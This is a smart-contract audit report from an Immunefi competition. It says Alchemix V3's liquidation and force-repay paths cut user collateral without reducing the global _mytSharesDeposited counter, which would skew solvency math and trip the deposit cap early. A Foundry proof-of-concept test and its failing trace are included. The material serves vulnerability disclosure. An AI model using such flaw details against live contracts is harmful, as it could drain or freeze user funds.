# 58491 sc high mytsharesdeposited not reduced on liquidation leading to deposit cap bypass and potential insovency

**Submitted on Nov 2nd 2025 at 17:36:26 UTC by @Bizarro for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58491
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Smart contract unable to operate due to lack of token funds
  * Protocol insolvency

## Description

## Brief/Intro

In the \_doLiquidation function, when a user is liquidated, their collateral balance is reduced but the global varibale \_mytSharesDeposited is not decreased accordingly. This results in an inconsistency between the actual MYT collateral held by the contract and the reported global deposits which can lead to insolvency.

## Vulnerability Details

The \_doLiquidation function fails to decrease \_mytSharesDeposited by the amount of collateral removed from the user during liquidation. This leads to an inflated view of total deposited MYT tokens in the protocol In \_forceRepay also there is no decrease in \_mytSharesDeposited after reducing collateralBalance

```solidity
function _doLiquidation(uint256 accountId, uint256 collateralInUnderlying, uint256 repaidAmountInYield)
        internal
        returns (uint256 amountLiquidated, uint256 feeInYield, uint256 feeInUnderlying)
    {
        ---

        amountLiquidated = convertDebtTokensToYield(liquidationAmount);
        feeInYield = convertDebtTokensToYield(baseFee);

        // update user balance and debt
@>1        account.collateralBalance = account.collateralBalance > amountLiquidated ? account.collateralBalance - amountLiquidated : 0;
        _subDebt(accountId, debtToBurn);

        ---
    }

function _forceRepay(uint256 accountId, uint256 amount) internal returns (uint256) {

        ---

        creditToYield = creditToYield > account.collateralBalance ? account.collateralBalance : creditToYield;
@2>        account.collateralBalance -= creditToYield;

        if (account.collateralBalance > protocolFeeTotal) {
@3>            account.collateralBalance -= protocolFeeTotal;
            // Transfer the protocol fee to the protocol fee receiver
            TokenUtils.safeTransfer(myt, protocolFeeReceiver, protocolFeeTotal);
        }

        ---
    }

```

* @1 -> In \_doLiquidation the collateralBalance of the user is decreased but the \_mytSharesDeposited is not decreased
* @2, @3 -> In \_forceRepay, user's collateralBalance is decreased but the \_mytSharesDeposited is not decreased.

Adding to this, the transmuter also uses the \_mytSharesDeposited amount to calculate the badDebtRatio which helps to determine if the user will get 1:1 for their alAsset deposited or not. If the badDebtRatio is greater than 1e18, then user will not get 1:1 for their tokens and the badDebtRatio is calculated as

```solidity
uint256 denominator = alchemist.getTotalUnderlyingValue() + alchemist.convertYieldTokensToUnderlying(yieldTokenBalance) > 0 ? alchemist.getTotalUnderlyingValue() + alchemist.convertYieldTokensToUnderlying(yieldTokenBalance) : 1;
        uint256 badDebtRatio = alchemist.totalSyntheticsIssued() * 10**TokenUtils.expectDecimals(alchemist.underlyingToken()) / denominator;
```

Here the denominator is inflated because of the inflated \_mytSharesDeposited amount leading to deflated badDebtRatio and causing protocol to pay 1:1 ratio of tokens to the redeemer even though the protocol should be transferring less amount of mytTokens.

```solidity
        if (badDebtRatio > 1e18) {
            scaledTransmuted = amountTransmuted * FIXED_POINT_SCALAR / badDebtRatio;
        }
```

This leads to protocol paying more that it should leading to insolvency as the 1:1 cannot be maintained because of alAssets being more than their collateral backing but still protocol has to pay 1:1 to the redeemer.

## Impact Details

1. Insolvency Risk: \_getTotalUnderlyingValue will be incorrect as the \_mytSharesDeposited will be inflated leading to insovency as the calculation will lead to a situation where it is unable to meet all user claims(alUSDC can be redeemed for 1:1 even when there isn’t enough backing)
2. Deposit Cap Bypass: As the mytSharesDeposited is not updated, the protocol's deposit cap logic will be reached way before the actual myt shares in the contract.

## References

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L852>

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/Transmuter.sol#L219>

## Proof of Concept

paste this test in `test/AlchemistV3.t.sol` and `forge test --mt test_mytSharesDeposited_not_Reduced -vvv`

```solidity
    function test_mytSharesDeposited_not_Reduced() external {
        // ------ set the deposit cap to depositAmount * 2 + 1
        vm.startPrank(alchemist.admin());
        alchemist.setDepositCap(depositAmount*2 + 1);
        vm.stopPrank();

        vm.startPrank(someWhale);
        IMockYieldToken(mockStrategyYieldToken).mint(whaleSupply, someWhale);
        vm.stopPrank();

        // ------- User 1 Deposits depositAmount 
        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount * 2);
        alchemist.deposit(depositAmount, yetAnotherExternalUser, 0);
        vm.stopPrank();

        // ------- User 2 Deposits depositAmount and borrow
        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount + 100e18);
        alchemist.deposit(depositAmount, address(0xbeef), 0);
        // a single position nft would have been minted to 0xbeef
        uint256 tokenIdFor0xBeef = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
        alchemist.mint(tokenIdFor0xBeef, alchemist.totalValue(tokenIdFor0xBeef) * FIXED_POINT_SCALAR / alchemist.minimumCollateralization(), address(0xbeef));
        vm.stopPrank();

        uint256 transmuterPreviousBalance = IERC20(address(vault)).balanceOf(address(transmuterLogic));

        uint256 initialVaultSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialVaultSupply);
        // increasing yeild token suppy by 900 bps or 9%  while keeping the unederlying supply unchanged
        uint256 modifiedVaultSupply = (initialVaultSupply * 900 / 10_000) + initialVaultSupply;
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(modifiedVaultSupply);

        // ------- External User liquidates user2 decreasing the collateral and myt balance of the contract.
        vm.startPrank(externalUser);
        (uint256 assets, uint256 feeInYield, uint256 feeInUnderlying) = alchemist.liquidate(tokenIdFor0xBeef);
        vm.stopPrank();

        // -------- Another user tries to deposit 2 wei amount of tokens leading to exceeded depositCap.
        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount * 2);
        alchemist.deposit(2, yetAnotherExternalUser, 0);
        vm.stopPrank();
    }
```

The function will revert with `IllegalState()` error.

```solidity
[3688] MockMYTVault::approve(TransparentUpgradeableProxy: [0x48c33395391C097df9c9aA887a40f1b47948D393], 400000000000000000000000 [4e23])
    │   ├─ emit Approval(owner: 0x520aB24368e5Ba8B727E9b8aB967073Ff9316961, spender: TransparentUpgradeableProxy: [0x48c33395391C097df9c9aA887a40f1b47948D393], value: 400000000000000000000000 [4e23])
    │   └─ ← [Return] true
    ├─ [3569] TransparentUpgradeableProxy::fallback(2, 0x520aB24368e5Ba8B727E9b8aB967073Ff9316961, 0)
    │   ├─ [2844] AlchemistV3::deposit(2, 0x520aB24368e5Ba8B727E9b8aB967073Ff9316961, 0) [delegatecall]
    │   │   └─ ← [Revert] IllegalState()
    │   └─ ← [Revert] IllegalState()
    └─ ← [Revert] IllegalState()

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 24.78ms (4.47ms CPU time)

Ran 1 test suite in 332.19ms (24.78ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in src/test/AlchemistV3.t.sol:AlchemistV3Test
[FAIL: IllegalState()] test_mytSharesDeposited_not_Reduced() (gas: 1421377)
```
